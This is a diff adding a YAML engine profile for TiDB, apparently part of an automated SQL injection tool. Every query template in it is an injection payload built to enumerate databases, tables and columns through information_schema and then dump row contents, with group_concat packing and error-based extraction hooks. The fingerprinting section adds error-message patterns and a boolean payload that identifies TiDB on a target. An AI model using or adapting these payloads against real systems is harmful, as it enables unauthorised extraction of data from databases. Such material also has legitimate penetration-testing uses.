@@ -1,0 +1,97 @@
+engine: Tidb
+clone: mysql.yml
+
+resource:
+
+ schema:
+  database: |
+   select group_concat(
+       ${enclose_value_hex},
+       r,
+       ${separator_qte_hex},
+       q,
+       ${enclose_value_hex}
+       order by r
+       separator '%23'
+   ) from (
+       select
+           schema_name r,
+           count(table_name) q
+       from information_schema.tables
+       right join information_schema.schemata
+       on schema_name = table_schema
+       group by r
+       /* Required by Error Extractvalue */
+       order by 1
+       ${limit}
+   ) x
+
+  table: |
+   select group_concat(
+       ${enclose_value_hex},
+       r,
+       ${separator_qte_hex},
+       q,
+       ${enclose_value_hex}
+       order by r
+       separator '%23'
+   ) from (
+       select
+           table_name r,
+           ifnull(table_rows, 0x30) q
+       from information_schema.tables
+       where table_schema = 0x${database.hex}
+       /* Required by Error Extractvalue */
+       order by 1
+       ${limit}
+   ) x
+
+  column: |
+   select group_concat(
+       ${enclose_value_hex},
+       n,
+       ${separator_qte_hex},
+       0,
+       ${enclose_value_hex}
+       order by n
+       separator '%23'
+   ) from (
+       select column_name n
+       from information_schema.columns
+       where table_schema = 0x${database.hex}
+       and table_name = 0x${table.hex}
+       /* Required by Error Extractvalue */
+       order by 1
+       ${limit}
+   ) x
+
+  row:
+   query: |
+    select group_concat(
+        ${enclose_value_hex},
+        r,
+        ${separator_qte_hex},
+        q,
+        ${enclose_value_hex}
+        order by r
+        separator '%23'
+    ) from (
+        select
+            concat(${fields}) r,
+            count(*) q
+        from `${database}`.`${table}`
+        group by r
+        /* Required by Error Extractvalue */
+        order by 1
+        ${limit}
+    ) x
+
+strategy:
+ configuration:
+  fingerprint:
+   errorMessage:
+    - You have an error in your SQL syntax; check the manual that corresponds to your TiDB version for the right syntax to use line \\d+ column \\d+ near ".*"
+    - tidb
+   orderByErrorMessage:
+    - Unknown column '1337' in 'order clause'
+   engineSpecific: if(${test} and instr(@@version_comment, 'tidb') > 0 and instr(lower(version()), 'tidb') > 0, binary('a'), 'b')=binary('a')
